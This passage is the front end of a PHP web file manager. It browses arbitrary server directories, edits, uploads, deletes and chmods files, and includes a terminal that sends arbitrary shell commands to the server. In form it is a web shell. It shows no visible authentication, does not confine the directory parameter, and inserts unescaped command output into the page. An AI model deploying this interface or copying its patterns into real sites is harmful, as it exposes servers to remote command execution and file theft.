            </button>
            <button id="createFileBtnMobile" class="btn btn-info btn-block mb-2" data-bs-toggle="modal" data-bs-target="#newFileModal">
                <i class="fas fa-file"></i> New File
            </button>
            <button class="btn btn-warning btn-block mb-2" data-bs-toggle="modal" data-bs-target="#uploadFileModal">
                <i class="fas fa-upload"></i> Upload File
            </button>
            <button class="btn btn-secondary btn-block mb-2" data-bs-toggle="modal" data-bs-target="#terminalModal">
                <i class="fas fa-terminal"></i> Terminal
            </button>
        </div>
    </div>

    
        <?php

       

        // Set the current directory to the one passed through the URL, or default to the base directory
        $directory = isset($_GET['dir']) ? $_GET['dir'] : $baseDir;

        // Normalize the directory path using realpath()
        $directory = realpath($directory);

        // Check if the directory is valid
        if (!$directory || !is_dir($directory)) {
            die("Invalid directory.");
        }


        function getFileIcon($filename) {
            $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
            switch ($extension) {
                case 'jpg':
                case 'jpeg':
                case 'png':
                case 'gif':
                case 'bmp':
                case 'svg':
                    return '<i class="fas fa-image text-success"></i>';
                case 'mp4':
                case 'avi':
                case 'mov':
                case 'wmv':
                    return '<i class="fas fa-video text-danger"></i>';
                case 'mp3':
                case 'wav':
                case 'ogg':
                    return '<i class="fas fa-music text-info"></i>';
                case 'pdf':
                    return '<i class="fas fa-file-pdf text-danger"></i>';
                case 'doc':
                case 'docx':
                    return '<i class="fas fa-file-word text-primary"></i>';
                case 'xls':
                case 'xlsx':
                    return '<i class="fas fa-file-excel text-success"></i>';
                case 'ppt':
                case 'pptx':
                    return '<i class="fas fa-file-powerpoint text-warning"></i>';
                case 'zip':
                case 'rar':
                case '7z':
                    return '<i class="fas fa-file-archive text-secondary"></i>';
                case 'php':
                    return '<i class="fab fa-php text-purple"></i>';
                case 'html':
                case 'htm':
                    return '<i class="fab fa-html5 text-danger"></i>';
                case 'css':
                    return '<i class="fab fa-css3-alt text-primary"></i>';
                case 'js':
                    return '<i class="fab fa-js-square text-warning"></i>';
                default:
                    return '<i class="fas fa-file text-secondary"></i>';
            }
        }
 

        //Display the clickable path of the current directory
        $pathParts = explode(DIRECTORY_SEPARATOR, $directory);
        $clickablePath = "";
        echo "<nav aria-label='breadcrumb'>";
        echo "<ol class='breadcrumb rounded-3'>";
        foreach ($pathParts as $key => $part) {
            $clickablePath .= ($key > 0 ? DIRECTORY_SEPARATOR : '') . $part;
            if ($key === array_key_last($pathParts)) {
                echo "<li class='breadcrumb-item active' aria-current='page'><strong>" . htmlspecialchars($part) . "</strong></li>";
            } else {
                echo "<li class='breadcrumb-item'><a href='?dir=" . urlencode($clickablePath) . "' class='text-decoration-none'>" . htmlspecialchars($part) . "</a></li>";
            }
        }
        echo "</ol>";
        echo "</nav>";

          // Scan the directory for files and directories
          $files = scandir($directory);

          // Filter out current (.) and parent (..) directories
          $files = array_diff($files, array( '.' , '..'));
  
          
        // Sort files and directories
          natcasesort($files);
  
     // Separate directories and files
    $dirs = array();
     $filesList = array();
  
    foreach ($files as $file) {
      $fullPath = $directory . DIRECTORY_SEPARATOR . $file;
      if (is_dir($fullPath)) {
          $dirs[] = $file;
      } else {
          $filesList[] = $file;
      }
    }
  
  // Combine sorted directories and files
  $sortedFiles = array_merge($dirs, $filesList);

 
    echo "<div class='list-group'>";
    echo "<div class='list-group-item list-group-item-secondary d-flex justify-content-between align-items-center fw-bold'>";
    echo "<div style='width: 40%'>Name</div>";
    echo "<div style='width: 15%'>Size</div>";
    echo "<div style='width: 15%'>Permissions</div>";
    echo "<div style='width: 20%'>Last Modified</div>";
    echo "<div style='width: 10%'>Actions</div>";
    echo "</div>";
    
    foreach ($sortedFiles as $file) {
        $filePath = $directory . DIRECTORY_SEPARATOR . $file;
        $isDir = is_dir($filePath);
        
        echo "<div class='list-group-item d-flex justify-content-between align-items-center'>";
        
        // Name column
        echo "<div style='width: 40%'>";
        if ($isDir) {
            echo "<a href='?dir=" . urlencode($filePath) . "' class='text-decoration-none'>";
            echo "<i class='fas fa-folder text-warning'></i> " . htmlspecialchars($file);
            echo "</a>";
        } else {
            $icon = getFileIcon($file);
            echo "<span>$icon " . htmlspecialchars($file) . "</span>";
        }
        echo "</div>";
        
        // Size column
        echo "<div style='width: 15%'>";
        if (!$isDir) {
            echo formatFileSize(filesize($filePath));
        } else {
            echo "-";
        }
        echo "</div>";
        
        // Permissions column
        echo "<div style='width: 15%'>";
        $perms = fileperms($filePath);
        $symbolicNotation = getSymbolicNotation($perms);
        $colorCodedNotation = getColorCodedNotation($symbolicNotation);
        echo "<span class='permission-notation'>" . $colorCodedNotation . "</span>";
        echo "</div>";
        
        // Last Modified column
        echo "<div style='width: 20%'>" . date("Y-m-d H:i:s", filemtime($filePath)) . "</div>";
        
        // Actions column
        echo "<div style='width: 10%' class='action-buttons'>";
        echo "<div class='dropdown'>";
        echo "<button class='btn btn-sm btn-secondary dropdown-toggle' type='button' id='dropdownMenuButton-{$file}' data-bs-toggle='dropdown' aria-expanded='false'>";
        echo "Actions";
        echo "</button>";
        echo "<ul class='dropdown-menu' aria-labelledby='dropdownMenuButton-{$file}'>";
        if ($isDir) {
            echo "<li><a class='dropdown-item rename-btn' href='#' data-file='" . urlencode(realpath($filePath)) . "' data-is-dir='1'>Rename</a></li>";
            echo "<li><a class='dropdown-item delete-btn' href='#' data-file='" . urlencode($filePath) . "' data-is-dir='1'>Delete</a></li>";
            echo "<li><a class='dropdown-item chmod-btn' href='#' data-file='" . urlencode($filePath) . "' data-is-dir='1'>Change Permissions</a></li>";
            echo "<li><a class='dropdown-item' href='?action=download&file=" . urlencode($file) . "&is_dir=1'>Download as ZIP</a></li>";
            echo "<li><a class='dropdown-item edit-btn' href='#' data-file='" . urlencode($filePath) . "'>Edit</a></li>";     
        } else {
            echo "<li><a class='dropdown-item edit-btn' href='#' data-file='" . urlencode($filePath) . "'>Edit</a></li>";
            echo "<li><a class='dropdown-item rename-btn' href='#' data-file='" . urlencode($filePath) . "'>Rename</a></li>";
            echo "<li><a class='dropdown-item delete-btn' href='#' data-file='" . urlencode($filePath) . "'>Delete</a></li>";
            echo "<li><a class='dropdown-item' href='?action=download&file=" . urlencode($file) . "'>Download</a></li>";
            echo "<li><a class='dropdown-item chmod-btn' href='#' data-file='" . urlencode($filePath) . "'>Change Permissions</a></li>";
        }
        echo "</ul>";
        echo "</div>";
        echo "</div>";
        
        echo "</div>";
    }
    echo "</div>";

    
   
function formatFileSize($bytes) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= (1 << (10 * $pow));
    return round($bytes, 2) . ' ' . $units[$pow];
}

function getSymbolicNotation($perms) {
    $info = "";
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function getColorCodedNotation($symbolicNotation) {
    $colorCoded = '';
    foreach (str_split($symbolicNotation, 3) as $group) {
        $colorCoded .= '<span style="color: ' . getColorForPermissionGroup($group) . ';">' . $group . '</span>';
    }
    return $colorCoded;
}

function getColorForPermissionGroup($group) {
    $readCount = substr_count($group, 'r');
    $writeCount = substr_count($group, 'w');
    $executeCount = substr_count($group, 'x') + substr_count($group, 's') + substr_count($group, 't');
    
    if ($readCount + $writeCount + $executeCount == 3) {
        return '#00ff00'; // Full permissions: Green
    } elseif ($readCount + $writeCount + $executeCount == 0) {
        return '#ff0000'; // No permissions: Red
    } elseif ($writeCount > 0) {
        return '#ffa500'; // Write permission: Orange
    } else {
        return '#ffff00'; // Other cases: Yellow
    }
}

// ... (rest of the code remains unchanged)
    //     ?>

     </div>

    <!-- Modals for edit, rename, and chmod -->
    <div class="modal fade" id="editModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"></h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <textarea class="form-control" id="fileContent" rows="10"></textarea>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    <button type="button" class="btn btn-primary" id="saveEdit">Save changes</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Rename Modal -->
<div class="modal fade" id="renameModal" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="renameModalLabel">Rename</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
      </div>
      <div class="modal-body">
        <input type="hidden" id="oldFileName">
        <div class="form-group">
          <label for="renameNewFileName">New Name:</label>
          <input type="text" class="form-control" id="renameNewFileName">
        </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary" id="saveRename">Rename</button>
      </div>
    </div>
  </div>
</div>
   
    <div class="modal fade" id="chmodModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"></h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <input type="hidden" id="chmodFileName">
                    <input type="hidden" id="chmodIsDir">
                    <input type="text" class="form-control" id="permissions" placeholder="Enter permissions (e.g., 0755)">
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    <button type="button" class="btn btn-primary" id="saveChmod">Change Permissions</button>
                </div>
            </div>
        </div>
    </div>

   
<div class="modal fade" id="newFolderModal" tabindex="-1" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Create New Folder</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <input type="text" class="form-control" id="newFolderName" placeholder="Enter folder name">
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                <button type="button" class="btn btn-primary" id="saveFolderBtn">Create</button>
            </div>
        </div>
    </div>
</div>

<!-- File Creation Modal -->
<div class="modal fade" id="createFileModal" tabindex="-1" aria-labelledby="newFileModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="newFileModalLabel">Create New File</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <form id="createFileForm">
                    <input type="text" class="form-control mb-2" id="createnewFileName" name="createnewFileName" placeholder="Enter file name">
                    <textarea class="form-control" id="newFileContent" name="newFileContent" rows="5" placeholder="Enter file content"></textarea>
                </form>
                <small id="autosaveIndicator" class="form-text text-muted mt-2" style="display: none;">Autosaving...</small>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                <button type="button" class="btn btn-primary" id="saveNewFile">Create</button>
            </div>
        </div>
    </div>
</div>


<!-- <div class="modal fade" id="uploadFileModal" tabindex="-1" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Upload File</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <input type="file" class="form-control" id="fileToUpload">
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                <button type="button" class="btn btn-primary" id="uploadFileBtn">Upload</button>
            </div>
        </div>
    </div>
</div> -->

<div class="modal fade" id="uploadFileModal" tabindex="-1" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Upload Files</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <form id="uploadForm" enctype="multipart/form-data">
                    <input type="file" class="form-control" id="filesToUpload" name="files[]" multiple>
                </form>
                <div id="uploadProgress" class="progress mt-3" style="display: none;">
                    <div class="progress-bar" role="progressbar" style="width: 0%;" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100">0%</div>
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                <button type="button" class="btn btn-primary" id="uploadFilesBtn">Upload</button>
            </div>
        </div>
    </div>
</div>

<div class="modal fade" id="terminalModal" tabindex="-1" aria-hidden="true">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Terminal</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <div id="terminal-output" class="mb-2" style="height: 300px; overflow-y: auto; background-color: #000; color: #fff; padding: 10px;"></div>
                <input type="text" class="form-control" id="terminal-input" placeholder="Enter command">
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                <button type="button" class="btn btn-primary" id="runCommandBtn">Run Command</button>
            </div>
        </div>
    </div>
</div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
    $(document).ready(function() {
    //Edit button click handler
        $('.edit-btn').click(function() {
            var file = $(this).data('file');
            $.post('', {action: 'get_content', file: file}, function(response) {
                var data = JSON.parse(response);
                if (data.error) {
                    alert(data.error);
                } else {
                    $('#editModal .modal-body textarea').val(data.content);
                    $('#editModal .modal-title').text('Edit ' + decodeURIComponent(file.split('/').pop()));
                    $('#editModal').data('file', file);
                    $('#editModal').modal('show');
                }
            });
        });

        // Save edit changes
        $('#saveEdit').click(function() {
            var file = $('#editModal').data('file');
            var content = $('#fileContent').val();
            $.post('', {action: 'save', file: file, content: content}, function(response) {
                var data = JSON.parse(response);
                alert(data.message || data.error);
                $('#editModal').modal('hide');
            });
        });

     

    $(document).on('click', '.rename-btn', function(e) {
    e.preventDefault();
    console.log("Rename button clicked");
    
    var file = $(this).data('file');
    var isDir = $(this).data('is-dir') === 1;
    console.log("File:", file);
    console.log("Is Directory:", isDir);
    
    $('#renameModal .modal-title').text('Rename ' + (isDir ? 'folder' : 'file') + ': ' + decodeURIComponent(file.split('/').pop()));
    $('#oldFileName').val(file);
    $('#renameNewFileName').val(decodeURIComponent(file.split('/').pop()));
    $('#renameModal').data('is-dir', isDir);
    
    console.log("About to show modal");
    $('#renameModal').modal('show');
    console.log("Modal shown");
});

$('#saveRename').on('click', function(e) {
    e.preventDefault();
    console.log("Save rename clicked");
    
    var oldName = $('#oldFileName').val();
    var newName = $('#renameNewFileName').val();
    var isDir = $('#renameModal').data('is-dir');
    
    console.log("Old name:", oldName);
    console.log("New name:", newName);
    console.log("Is Directory:", isDir);
    
    $.ajax({
        url: '',
        method: 'POST',
        data: {
            action: 'rename',
            oldName: oldName,
            newName: newName,
            is_dir: isDir ? 1 : 0
        },
        dataType: 'json',
        success: function(response) {
            console.log("Rename response received:", response);
            if (response.success) {
                alert(response.message);
                $('#renameModal').modal('hide');
                location.reload();
            } else {
                alert("Error: " + response.message);
            }
        },
        error: function(xhr, status, error) {
            console.error("Rename request failed:", status, error);
            console.log("Response text:", xhr.responseText);
            alert("Error: " + error + ". Check console for details.");
        }
    });
});



    $('.delete-btn').click(function() {
    var file = $(this).data('file');
    var isDir = $(this).data('is-dir') == 1;
    var $button = $(this);

    function performDelete(confirmed = false) {
        $.ajax({
            url: '',
            method: 'POST',
            data: {
                action: 'delete',
                file: file,
                is_dir: isDir ? 1 : 0,
                confirmed: confirmed ? 1 : 0
            },
            dataType: 'json',
            success: function(data) {
                if (data.success) {
                    alert(data.message);
                    location.reload();
                } else if (data.needConfirmation) {
                    if (confirm(data.message + ' Are you sure you want to delete this folder and all its contents?')) {
                        performDelete(true);
                    }
                } else {
                    alert("Error: " + data.message);
                }
            },
            error: function(jqXHR, textStatus, errorThrown) {
                console.error("AJAX error: " + textStatus + ' : ' + errorThrown);
                alert("An error occurred while deleting. Please check the console for more details.");
            }
        });
    }

    var message = isDir ? 'Are you sure you want to delete this folder?' : 'Are you sure you want to delete this file?';
    if (confirm(message)) {
        performDelete();
    }
});

        // Chmod button click handler
        $(document).on('click', '.chmod-btn', function() {
            var file = $(this).data('file');
            var isDir = $(this).data('is-dir') === 1;
            $('#chmodModal .modal-title').text('Change permissions for ' + (isDir ? 'folder' : 'file') + ': ' + decodeURIComponent(file.split('/').pop()));
            $('#chmodFileName').val(file);
            $('#chmodIsDir').val(isDir ? 1 : 0);
            $('#chmodModal').modal('show');
        });

        // Save chmod
        $('#saveChmod').click(function() {
            var file = $('#chmodFileName').val();
            var permissions = $('#permissions').val();
            var isDir = $('#chmodIsDir').val() === '1';
            $.post('', {action: 'chmod', file: file, permissions: permissions, is_dir: isDir ? 1 : 0}, function(response) {
                var data = JSON.parse(response);
                alert(data.message || data.error);
                $('#chmodModal').modal('hide');
            });
        });

        // Theme switch
        const toggleSwitch = document.querySelector('.theme-switch input[type="checkbox"]');

        function switchTheme(e) {
            if (e.target.checked) {
                document.body.classList.remove('light-mode');
                localStorage.setItem('theme', 'dark');
            } else {
                document.body.classList.add('light-mode');
                localStorage.setItem('theme', 'light');
            }    
        }

        toggleSwitch.addEventListener('change', switchTheme, false);

        // Check for saved user preference, if any, on load of the website
        const currentTheme = localStorage.getItem('theme');
        if (currentTheme) {
            if (currentTheme === 'light') {
                document.body.classList.add('light-mode');
                toggleSwitch.checked = false;
            }
        }
    });

    
    // ... existing code ...

    // Create New Folder button click handler
    $('#createFolderBtn').click(function() {
        $('#newFolderModal').modal('show');
    });

    // Save new folder
    $('#saveFolderBtn').click(function() {
        var folderName = $('#newFolderName').val();
        if (folderName) {
            $.post('', {
                action: 'create_folder',
                folder_name: folderName,
                directory: '<?php echo urlencode($directory); ?>'
            }, function(response) {
                var data = JSON.parse(response);
                if (data.success) {
                    alert(data.message);
                    location.reload();
                } else {
                    alert("Error: " + data.message);
                }
                $('#newFolderModal').modal('hide');
            });
            
        } else {
            alert("Please enter a folder name.");
        }
    });

    document.addEventListener('DOMContentLoaded', function() {
     var createFileModal = new bootstrap.Modal(document.getElementById('createFileModal'));
     
     document.querySelectorAll('#createFileBtn, #createFileBtnMobile').forEach(function(button) {
       button.addEventListener('click', function() {
         createFileModal.show();
       });
     });
   });

    // Save new file
    $('#saveNewFile').click(function() {
        var fileName = $('#createnewFileName').val();
        var fileContent = $('#newFileContent').val();
        
        if (fileName) {
            $.ajax({
                url: '',
                method: 'POST',
                data: {
                    action: 'create_file',
                    file_name: fileName,
                    content: fileContent,
                    directory: '<?php echo urlencode($directory); ?>'
                },
                dataType: 'json',
                success: function(response) {
                    if (response.success) {
                        alert(response.message);
                        location.reload();
                    } else {
                        alert("Error: " + response.message);
                    }
                    $('#createFileModal').modal('hide');
                },
                error: function(jqXHR, textStatus, errorThrown) {
                    console.error("AJAX error: " + textStatus + ' : ' + errorThrown);
                    alert('An error occurred while creating the file.');
                }
            });
        } else {
            alert("Please enter a file name.");
        }
    });


$('#uploadFilesBtn').on('click', function() {
    var files = $('#filesToUpload')[0].files;
    console.log("Files selected:", files.length);
    
    if (files.length === 0) {
        alert('Please select one or more files to upload.');
        return;
    }

    var formData = new FormData();
    for (var i = 0; i < files.length; i++) {
        formData.append('files[]', files[i]);
        console.log("Appending file:", files[i].name);
    }
    formData.append('action', 'upload');
    formData.append('directory', '<?php echo urlencode($directory); ?>');

    $.ajax({
        url: '',
        type: 'POST',
        data: formData,
        processData: false,
        contentType: false,
        xhr: function() {
            var xhr = new window.XMLHttpRequest();
            xhr.upload.addEventListener("progress", function(evt) {
                if (evt.lengthComputable) {
                    var percentComplete = evt.loaded / evt.total * 100;
                    $('.progress-bar').width(percentComplete + '%').attr('aria-valuenow', percentComplete).text(percentComplete.toFixed(2) + '%');
                }
            }, false);
            return xhr;
        },
        beforeSend: function() {
            $('#uploadProgress').show();
            $('.progress-bar').width('0%').attr('aria-valuenow', 0).text('0%');
        },
        success: function(response) {
            console.log("Raw response:", response);
            try {
                var jsonResponse = JSON.parse(response);
                console.log("Parsed response:", jsonResponse);
                if (jsonResponse.success) {
                    alert(jsonResponse.message);
                    $('#uploadFileModal').modal('hide');
                    location.reload();
                } else {
                    alert('Error: ' + jsonResponse.message);
                }
            } catch (e) {
                console.error("Error parsing JSON:", e);
                alert('An error occurred while processing the server response.');
            }
        },
        error: function(xhr, status, error) {
            console.error("AJAX error:", status, error);
            console.log("Response text:", xhr.responseText);
            alert('An error occurred while uploading the files.');
        },
        complete: function() {
            $('#uploadProgress').hide();
        }
    });
});


document.getElementById('runCommandBtn').addEventListener('click', function() {
    var command = document.getElementById('terminal-input').value;
    fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'action=execute_command&command=' + encodeURIComponent(command)
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            document.getElementById('terminal-output').innerHTML += '<p>> ' + command + '</p>';
            document.getElementById('terminal-output').innerHTML += '<pre>' + data.output + '</pre>';
        } else {
            alert('Error executing command');
        }
    });
});


    </script>
</body>
</html>